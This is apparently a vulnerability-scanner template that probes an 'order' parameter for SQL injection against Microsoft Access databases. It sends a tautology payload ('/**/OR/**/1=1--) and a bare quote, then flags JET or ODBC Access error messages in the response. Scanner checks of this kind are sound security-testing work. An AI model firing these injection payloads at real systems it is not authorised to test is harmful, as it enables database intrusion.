id: sqli6-access-24
name: 'SQLi access probe in order'
severity: high
type: active
tags:
  - sqli
  - injection
  - access
description: 'Triggers access error via order'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      order:
        - '''/**/OR/**/1=1--'
        - ''''
    matchers:
      - type: regex
        part: body
        regex:
          - 'Microsoft JET'
          - 'ODBC Microsoft Access'
